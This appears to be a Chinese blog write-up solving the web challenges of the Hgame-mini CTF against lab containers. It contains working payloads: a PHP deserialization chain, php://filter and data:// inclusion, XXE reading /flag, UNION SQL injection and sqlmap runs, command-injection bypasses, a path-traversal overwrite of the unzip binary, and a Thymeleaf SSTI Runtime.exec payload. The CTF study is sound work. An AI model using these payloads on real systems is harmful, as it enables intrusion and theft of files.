# Hgame-mini Web-writeups

### Get Post Universe

打开页面是这样的:

![](C:\Users\24993\Desktop\博客文章\static\GPU-1.png)

页面提示看起来好像需要我们GET一个参数money,它的值为10000.

我们直接在url中构造get传参.在靶机url后输入?money=10000,出现如下界面:

![](C:\Users\24993\Desktop\博客文章\static\GPU-2.png)

看起来还需要我们post一个参数`card_id`,它的值为7890234.

可以用burp传,也可以用各大语言的库构造一个代码来实现.

最近在学PHP,整了一个玩玩:

```php
<?php
// 目标 URL
$url = "http://1.container.jingsai.apicon.cn:31406/?money=10000";

// POST 数据
$data = array('card_id' => '7890234');

// 创建一个 HTTP 上下文
$context = stream_context_create(array(
    'http' => array(
        'method' => 'POST',
        'header' => 'Content-Type: application/x-www-form-urlencoded',
        'content' => http_build_query($data),
    ),
));

// 发送 POST 请求
$response = file_get_contents($url, false, $context);

// 输出返回内容
echo "Response Content:\n";
echo $response;
?>

```

返回下图的数据,拿到flag.

![](C:\Users\24993\Desktop\博客文章\static\GPU-3.png)

**flag**:`VIDAR{N0w_Y0u_hav5_LearNed_AB0u7_GET_4nD_POST!!!}`

### TuTu's shop

打开靶机,提示如图

![](C:\Users\24993\Desktop\博客文章\static\tutu_shop_1.png)

随便拉拉试试

![tutu_shop_2](C:\Users\24993\Desktop\博客文章\static\tutu_shop_2.png)

不行,抓个包看看![tutu_shop_3](C:\Users\24993\Desktop\博客文章\static\tutu_shop_3.png)

burp改个包,全买了![tutu_shop_4](C:\Users\24993\Desktop\博客文章\static\tutu_shop_4.png)

ez

![tutu_shop_5](C:\Users\24993\Desktop\博客文章\static\tutu_shop_5.png)

flag:`VIDAR{3a2633da80483d3995317fb5f837b01174e628ed}`

### The Knife

打开页面,如图所示

![](C:\Users\24993\Desktop\博客文章\static\sword_1.png)

查看页面源代码:

![sword_2](C:\Users\24993\Desktop\博客文章\static\sword_2.png)

使用御剑目录扫描工具,得知文件存在后门php-backdoor.php

![sword_3](C:\Users\24993\Desktop\博客文章\static\sword_3.png)

![sword_4](C:\Users\24993\Desktop\博客文章\static\sword_4.png)

使用中国蚁剑工具进行连接,获取到对应服务器的操作权限

![](C:\Users\24993\Desktop\博客文章\static\sword_5.png)

查看根目录,发现flag

![sword_6](C:\Users\24993\Desktop\博客文章\static\sword_6.png)

![sword_7](C:\Users\24993\Desktop\博客文章\static\sword_7.png)

flag:`VIDAR{G5T_the_dir!H4cKTH3bacKdOOR_You_Get_The_Sh5LL!!!!}`

### Fatal Command

打开页面显示如下:

![](C:\Users\24993\Desktop\博客文章\static\figlet_2.png)

figlet是一个可以把输入转换成ascii艺术字的库

![](C:\Users\24993\Desktop\博客文章\static\figlet_3.png)

![figlet_3](C:\Users\24993\Desktop\博客文章\static\figlet_1.png)

这里实际上执行的语句是`cat /flag`,即从根目录查找flag

直接输入指令会被过滤显示give up,所以我们需要利用一些命令绕过的知识,例如利用`$1`分割敏感词,利用`${IFS}`绕过空格等等.

flag:`VIDAR{C0mmand_1njection_1s^sO0O_inter3st1n5~!}`

### My Notebook

打开靶机页面显示如图

![](C:\Users\24993\Desktop\博客文章\static\notebook_1.png)

查看源代码,我们发现了一些提示:

![notebook_2](C:\Users\24993\Desktop\博客文章\static\notebook_2.png)

输入`/www.zip,我们获得了页面源码

其中有用的几个代码:

mainclass.php:

```php
<?php
class HereWeGo{
    public $try;
    public function __destruct(){//对象销毁时触发
        $this->try->gogogo();
    }
}

class GoGoGo{
    public $go;

    public function __construct($go)//对象创建时触发
    {
        $this->go = $go;
    }

    public function __call($name,$arguments){
        return $this->go->web;
    }
}

class Evil{//定义一个Evil类，他有file，final两个属性
    public $file;
    public $final;

    public function __construct($file){
        $this->file = $file;
    }
    //The flag is in /flag
    public function __get($Attribute){
        $result = file_get_contents($this->file);
        if(preg_match('/vidar/i',$result)){//有vidar就写hacker
            $this->final = "HACKER!!!";
            file_put_contents('flag.txt',$this->final);
            return;
        }
        $this->final = $result;
        file_put_contents('flag.txt',$this->final);
    }
}
```

使用PHP弱类型碰撞:**Checkcode1=QNKCDZO,Checkcode2=240610708**成功进入第二步.

可以看出,我们并不能直接读取flag的值,flag的值中包含了vidar这个字符串,会触发过滤规则.

我们利用php伪协议对flag进行读取,令最终的file的值为:

```php
php://filter/read=convert.base64-encode/resource=/flag
```

这样,我们就可以利用PHP伪协议读取flag了.当然,读取出来的是base64编码后的flag,再转码即可获得原flag.

接下来是利用PHP反序列化漏洞来构造payload.

在 PHP 中，`__get` 方法用于在访问一个对象的不可访问属性时触发,而`__call` 方法用于在尝试调用一个对象的不可访问方法时触发.我们需要按照pop链来构造一个有效的反序列payload.

触发序列为_ _destruct()->

构造如下PHP程序产生payload.

```php
<?php
class HereWeGo{
    public function __construct() {
        $this->go = new GoGoGo();
    }}
class GoGoGo{
    public $go;
    public function __construct() {
        $this->go = new Evil();
    }
}
class Evil {
    public $file;
    public function __construct() {
        $this->file = "php://filter/read=convert.base64-encode/resource=/flag";
    }
}
$payload=new HereWeGo();
var_dump(serialize($payload));
?>
```

payload:

```php
O:8:"HereWeGo":1:{s:3:"try";O:6:"GoGoGo":1:{s:2:"go";O:4:"Evil":1:{s:4:"file";s:54:"php://filter/read=convert.base64-encode/resource=/flag";}}}
```

flag:`VIDAR{Php,BeAwAre0FUnS@vE_uNsEr1al1z5=o==o=}`

### Read Something Useful

查看靶机页面

![](C:\Users\24993\Desktop\博客文章\static\page.png)

查看页面源代码,文件包含漏洞

![](C:\Users\24993\Desktop\博客文章\static\sourcecode.png)

**payload:/index.php?file=php://filter/read=convert.base64-encode/resource=emoji**

emoji.php

```html
<div style="text-align: center;">
    <h4>It is so funny, isn't it</h4>
    <img style="width: 10%" src="img/<?php echo rand(1,10);?>.gif">
</div>
```

**payload:/index.php?file=php://filter/emoji/read=convert.base64-encode/resource=index**

index.php

```php+HTML
<html>
    <head>
        <meta charset="utf-8">
        <meta name="author" content="R1esbyfe">
        <meta name="keywords" content="Challenge12">
    </head>
        <body>
        <div style="text-align: center">
            <!-- try to read index.php first! -->
            <h4>Try to click the button to enjoy my emoji!!!</h4>
            <form action="index.php" method="get">
                <input type="hidden" name="file" id="file" value="emoji">
                <button type="submit">Click me</button>
                <!-- You may find it is a little difficult to read other files, right :( -->
                <!-- in index.php:

                    $file = $_GET['file'];
                    if(strpos($file, "emoji") !== false){
                    include($file.'.php');
                    }
                -->
            </form>
        </div>
        </body>
</html>

<?php
include('blacklist.php');

//try to read findme.php to find my secrets :D

$file = $_GET['file'];

if(isset($file)){
    foreach ($blacklist as $blacklistedWord) {
        if (preg_match('/(?i)' . $blacklistedWord . '/', $file)) {
            echo "<center>nonono</center>";
            return;
        }
    }

    if(strpos($file, "emoji") !== false){
        include($file.'.php');
    }else{
        echo "<center>No,You need to find another way to find my secret :(</center>";
        return;
    }
}
?>


```

**payload:/index.php?file=php://filter/emoji/read=convert.base64-encode/resource=findme**

fineme.php

```php
<?php
    $flag = $_ENV['FLAG'];

    $lucky = $_GET['luckynumber'];
    $context = $_POST['context'];

    if(isset($lucky)&&isset($context)){
        if(is_numeric($lucky)){
            die("Not a number");
        }elseif($lucky == 777){
            if(file_get_contents($context,'r') === "humanoid"){
                    echo "Congratulations, the flag is: ".$flag;
            }else{
                die("Try again");
            }
        }
    }else{
        return;
    }

```

因此我们需要传入两个参数,令lucky非数字且在PHP弱类型比较中与777相等;令file_get_contents($context,'r')的值为"humanoid",我们需要用到data://伪协议伪造从文件读取数据.`data://text/plain;base64,aHVtYW5vaWQ=`#aHVtYW5vaWQ=是humanoid的base64编码

使用python进行双重传参.

```python
import requests
# 构造伪协议字符串，以伪造 "humanoid" 字符串
fake_context = "data://text/plain;base64,aHVtYW5vaWQ="

# 定义POST请求参数
post_params = {'context': fake_context}

# 目标URL
url = 'http://1.container.jingsai.apicon.cn:32212/findme.php/luckynumber=777a'
# 发送POST请求
post_response = requests.post(url, data=post_params)
print('POST:', post_response.text)
```

注意,这里用到了php弱类型比较."777"==777 777a==777均符合要求,但"777"不满足payload,会使条件不满足.

flag:`VIDAR{ReAD*My_F1lE_inA*Flexible_way_and_ExPl0it!mySEcret}`

### Do you know HTTP

1.**请从vidar.club来到这个页面**

Referer:vidar.club

2.**请通过Mozilla/5.0 (Vidar-Team; VidarOS x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36来到这个页面**

User-Agent:Mozilla/5.0 (Vidar-Team; VidarOS x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36

3.**让请求从本地来到这个页面**

X-Forwarded-For:127.0.0.1

4.**Hello guest! only admin can get flag.**

Cookie:user=admin

5.**You are admin! Flag is in this page**

headers:Fl4g:`VIDAR{HTTP_1s^re4lly$1nteresting}`

### watch carefully

进去打开,是一个文件上传页面,使用burpsuite抓包,会发现除了文件,还有一个元素

"OurName":"Vider"

把vider改成vidar,就可以拿到flag

```http
HTTP/1.1 200 OK
Server: Werkzeug/2.2.3 Python/3.7.17
Date: Mon, 16 Oct 2023 12:40:32 GMT
Content-Type: application/json
Content-Length: 34
Connection: close

{"flag":"VIDAR{W@tch CaRefu11y}"}
```

flag:`VIDAR{W@tch CaRefu11y}`

### TuTu's Diary Book

扫描发现上传了源码到/www.tar.gz

下载源码并审计

```php
<?php
    $diary_template = "<?xml version='1.0' encoding='utf-8'?>
        <diary>
            <date>%s</date>
            <feeling>%s</feeling>
            <content>%s</content>
        </diary>
    ";

    date_default_timezone_set('Asia/Shanghai');
    $system_date = date('Y-m-d H:i:s');
    extract($_REQUEST);
    if(isset($feeling) && isset($content)) {
        if($content == "") {
            echo "⛌ 日记内容不能为空";
            die();
        }
        $diary = sprintf($diary_template, $system_date, $feeling, $content);
        $diary_filename = date('Y-m-d') . ".xml";
        file_put_contents('./diaries/' . $diary_filename, $diary);
        header("Location: /readdiary.php?diary_date=" . date('Y-m-d'));
    } else {
        echo "feeling and content must be set.";
        die();
    }
?>
```

```php
<?php
    extract($_REQUEST);
    if(isset($diary_date)) {
        // Check diary file.
        if(!preg_match('/^([0-9]{4})-([0-9]{2})-([0-9]{2})$/',$diary_date)) {
            echo "invaild diary_date input.";
            die();
        }
        $diary_file = "./diaries/" . $diary_date . ".xml";
        if(!file_exists($diary_file)) {
            echo "†没有这一天的日记†";
            die();
        }
        // The diary file is now vaild. 
        // Read diary file.
        
        $diary_dom = new DOMDocument();
        $diary_dom->loadXML(file_get_contents($diary_file) , LIBXML_NOENT | LIBXML_DTDLOAD);
        $diary = simplexml_import_dom($diary_dom);
    } else {
        echo "diary_date must be set.";
        die();
    }
?>

<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8"> 
	<title>阅读日记</title> 
    <link rel="stylesheet" href="./css/bootstrap.min.css">
    <script src="./js/jquery.min.js"></script>
    <script src="./js/bootstrap.min.js"></script>
</head>
<body>

<div class="container">
	<h2><?php echo $diary->date; ?></h2>
    <h3>这是<?php echo htmlspecialchars($diary->feeling); ?>的一天</h3>
    <br>
    <h4><?php echo str_replace("\n", "<br>", htmlspecialchars($diary->content)); ?></h4>
</div>

</body>
</html>
```

发现使用了extract($_REQUEST)方法来自动更新变量的值,导致了变量覆盖漏洞.

联想到XXE漏洞,在get参数中传入diary_template=

```xml
<?xml version='1.0' encoding='utf-8'?>
<!DOCTYPE diary[<!ENTITY content SYSTEM "file:///flag" >]>
<diary>
    <date>%s</date>
    <feeling>%s</feeling>
    <content>&content;</content>
</diary>
```

注意需要使用编码来传,不可以直接传,使用burp修改之后大概像这样

```http
GET /newdiary.php?feeling=%E5%BC%80%E5%BF%83&content=123&diary_template=%3C%3Fxml+version%3D%271.0%27+encoding%3D%27utf-8%27%3F%3E%0D%0A%3C%21DOCTYPE+diary%5B%3C%21ENTITY+content+SYSTEM+%22file%3A%2F%2F%2Fflag%22+%3E%5D%3E%0D%0A%3Cdiary%3E%0D%0A++++%3Cdate%3E%25s%3C%2Fdate%3E%0D%0A++++%3Cfeeling%3E%25s%3C%2Ffeeling%3E%0D%0A++++%3Ccontent%3E%24content%3C%2Fcontent%3E%0D%0A%3C%2Fdiary%3E HTTP/1.1
Host: 1.container.jingsai.apicon.cn:30133
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://1.container.jingsai.apicon.cn:30133/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

传上去之后即可得到flag.

flag:`VIDAR{A11_st0r!es_begiN_with_4_f0rgotten_Archive_fi1e}`

所有的故事都来源于一个被遗忘的源码备份:)

### Book Management System

1.SQLMAP一把梭

下载好sqlmap,进入有py文件的文件夹,打开文件夹,输入cmd,打开命令行

```
python sqlmap.py -u "http://1.container.jingsai.apicon.cn:30956/books/1" -dbs
```

available databases [2]:
[*] book
[*] information_schema

```
python sqlmap.py -u "http://1.container.jingsai.apicon.cn:30956/books/1" -D book -tables
```

Database: book
[2 tables]
+--------+
| books  |
| secret |
+--------+

```
python sqlmap.py -u "http://1.container.jingsai.apicon.cn:30956/books/1" -D book -T secret --columns
```

+--------+-----------+
| Column | Type      |
+--------+-----------+
| fl4g   | char(255) |
+--------+-----------+

```
python sqlmap.py -u "http://1.container.jingsai.apicon.cn:30956/books/1" -D book -T secret -C fl4g --dump
```

Database: book
Table: secret
[1 entry]
+--------------------------------+
| fl4g                           |
+--------------------------------+
| VIDAR{i^Learned_Sql$Inject1on} |
+--------------------------------+

2.手动注入

1'UNION SELECT 1,table_name,1 FROM information_schema.tables LIMIT 2,1 ;%00

```
Vidar-Team has 1 books called secret
```

表名是secret

1' UNION SELECT 1, column_name, 1 FROM information_schema.columns WHERE table_name = 'secret' LIMIT 1,1;%00

```
Vidar-Team has 1 books called fl4g
```

字段名是fl4g

1'UNION SELECT 1,fl4g,1 FROM secret LIMIT 1,1 ;%00

```
Vidar-Team has 1 books called VIDAR{i^Learned_Sql$Inject1on}
```

flag:`VIDAR{i^Learned_Sql$Inject1on}`

### Book Management System_V2

类似第一题,不过不太方便使用sqlmap,就是手注+大小写绕过.

1'Union Select 1,table_name,1 From infoRmation_schema.tables LIMIT 2,1 ;%00

```
Vidar-Team has 1 books called seeeeeeeeeeeeeeeecrret
```

1'Union Select 1,column_name,1 From infoRmation_schema.columns LIMIT 4,1 ;%00

```
Vidar-Team has 1 books called fllllllllllllllllllllllaaa444g
```

1'Union Select 1,fllllllllllllllllllllllaaa444g,1 From seeeeeeeeeeeeeeeecrret LIMIT 1,1 ;%00

```
Vidar-Team has 1 books called VIDAR{U*Re4lly^Kn0wn_Sql$Inject1on}
```

flag:`VIDAR{U*Re4lly^Kn0wn_Sql$Inject1on}`

### unzip, or not?

源码审计题.提供了一个go源文件和docker文件.

```go
r.POST("/unzip", func(c *gin.Context) {
       fh, err := c.FormFile("file") //获取一个名叫file变量的值
       if err != nil {
          log.Println(err)
          c.String(500, "读取文件失败")
       }
       savepath := filepath.Clean(filepath.Join("uploads", strings.ReplaceAll(fh.Filename, "../", "")))

       file, err := fh.Open()
       if err != nil {
          log.Println(err)
          c.String(500, "读取文件失败")
       }
       defer file.Close()

       saveto, err := os.OpenFile(savepath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0755)
       if err != nil {
          log.Println(err)
          c.String(500, "保存文件失败")
       }
       defer saveto.Close()

       _, err = io.Copy(saveto, file)
       if err != nil {
          print(savepath)
          log.Println(err)
          c.String(500, "保存文件失败")
       }

       res, err := Unzip(savepath)
       if err != nil {
          log.Println(err)
          print(savepath)
          c.String(500, "解压失败")
       }

       // show unzip log
       c.String(200, string(res))
    })

    r.Run(":8180")
}

func Unzip(zipfile string) ([]byte, error) {
    unzipdir := filepath.Join("output", strconv.Itoa(rand.Int()))
    print(unzipdir)
    output, err := exec.Command("unzip", "-n", "-v", zipfile, "-d", unzipdir).CombinedOutput()
    if err != nil {
       return nil, err
    }

    return output, nil
}
```

提供了一个go语言接口,允许使用post方法向/unzip路由上传文件.

_, err = io.Copy(saveto, file)会把上传的文件拷贝到saveto路径,由此我们可以猜想可以通过目录穿越来实现覆写unzip文件

<!DOCTYPE html>
<html>
<head>
    <title>File Upload</title>
</head>
<body>
    <h1>Upload a File</h1>
    <form method="POST" action="http://1.container.jingsai.apicon.cn:31889/unzip" enctype="multipart/form-data">
        <input type="file" name="file" required>
        <br>
        <input type="submit" value="Upload">
    </form>
</body>
</html>

使用gpt生成了上述html代码从而实现上传文件到对应路由.要覆写的文件位于`usr/bin/unzip`路径,我们使用目录穿越实现覆写.

我们需要一个二进制文件来实现功能"cat /flag"

```C
#include <stdio.h>
#include <stdlib.h>

int main() {
    system("cat /flag");
    return 0;
}
```

打开Ubuntu虚拟机,open in terminal:

```bash
nano catflag.c
```

输入上面的代码,ctrl+s保存,ctrl+x退出编辑.

```bash
sudo apt update
sudo apt install gcc
```

安装gcc编译器

```bash
gcc catflag.c -o catflag
```

完成编译,产生二进制文件.由于虚拟机不太方便传文件,我登陆了微信网页文件助手来传输二进制文件.

复制到桌面上把名字改成unzip,打开burpsuite,上传抓包修改文件名为"....//....//bin/usr/unzip"(双写绕过目录穿越检测)

这样指令就会覆盖成功.这个时候重新上传一个文件,就可以得到flag(这题是动态flag,就不放了)

也可以自己在docker中进行测试,我的docker比较烂(x)

### What's problem In Login Code?

下载下来了一个jar文件,使用idea进行反编译

```java
protected void configure(AuthenticationManagerBuilder auth) throws Exception {
    ((InMemoryUserDetailsManagerConfigurer)auth.inMemoryAuthentication().withUser("admin").password(this.passwordEncoder().encode("admin")).roles(new String[]{"ADMIN"}).and()).withUser("user").password(this.passwordEncoder().encode("woshiuser")).roles(new String[]{"USER"});
}
```

发现两个用户名密码(ADMIN,admin)(user,woshiuser),使用admin账号进行登录,没什么用

```java
public class LoginController {
    public LoginController() {
    }

    @RequestMapping({"/login"})
    public String login() {
        return "login";
    }

    @GetMapping({"/logout"})
    public String logout(@RequestParam(required = false,defaultValue = "index") String page) {
        return page;
    }
}
```

研究了一下logincontroller,发现可以传入参数page,并且存在错误回显

payload:http://1.container.jingsai.apicon.cn:31953//page=lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("cat%20/flag").getInputStream()).next()%7d__::.x

获取flag成功.